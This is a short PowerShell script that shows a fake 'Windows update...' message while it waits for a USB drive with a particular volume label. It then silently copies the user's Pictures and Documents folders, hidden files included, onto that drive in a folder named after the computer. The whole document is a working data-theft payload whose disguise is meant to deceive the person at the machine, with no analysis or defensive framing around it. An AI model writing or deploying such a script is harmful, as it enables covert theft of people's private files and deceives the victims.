$dirs = @(@("pictures", "c:\users\$env:username\pictures"),@("documents", "c:\users\$env:username\documents"))
$expectedDriveName = "34BH88FRL9"
cls
write-host "Windows update..."
while($true) {
    $driveLetter = (get-psdrive -psprovider filesystem | where-object description -eq $expectedDriveName).name 
    if($driveLetter -match '[A-Z]') {
        break
    }
    sleep(1)
}
foreach($i in $dirs) {
    $path = $i[1]
    $name = $i[0]
    if(test-path $path) {
        xcopy $path $driveLetter":\"$env:computername"\"$name"\" /c /e /h /y /q
        cls
    }
}
exit
